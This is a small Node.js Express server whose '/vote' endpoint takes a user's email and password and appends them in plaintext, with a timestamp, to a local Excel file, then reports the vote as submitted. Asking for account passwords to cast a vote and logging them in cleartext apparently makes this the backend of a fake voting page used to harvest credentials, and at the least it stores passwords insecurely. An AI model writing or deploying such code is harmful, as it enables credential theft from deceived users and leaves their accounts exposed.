const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const XLSX = require('xlsx'); // Import the xlsx package
const path = require('path');

const app = express();
const PORT = 3000;

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Function to add data to an Excel file
function addToExcel(data) {
    const filePath = './voting_data.xlsx';

    // Check if the file exists
    let workbook;
    if (fs.existsSync(filePath)) {
        workbook = XLSX.readFile(filePath);
    } else {
        workbook = XLSX.utils.book_new(); // Create a new workbook
    }

    // Get the first sheet or create a new one
    const sheetName = 'Votes';
    let worksheet = workbook.Sheets[sheetName];
    if (!worksheet) {
        worksheet = XLSX.utils.json_to_sheet([]); // Initialize an empty sheet if it doesn't exist
        XLSX.utils.book_append_sheet(workbook, worksheet, sheetName);
    }

    // Read existing data
    const existingData = XLSX.utils.sheet_to_json(worksheet);

    // Add the new data
    existingData.push(data);

    // Convert the updated data back to a worksheet
    const newWorksheet = XLSX.utils.json_to_sheet(existingData);
    workbook.Sheets[sheetName] = newWorksheet;

    // Write the updated workbook to the file
    XLSX.writeFile(workbook, filePath);
}

// Handle voting POST request
app.post('/vote', (req, res) => {
    const { email, password } = req.body;

    if (email && password) {
        // Add data to the Excel file
        addToExcel({ email, password, date: new Date().toISOString() });

        res.status(200).send('Vote submitted successfully and saved to Excel.');
    } else {
        res.status(400).send('Invalid input.');
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
 
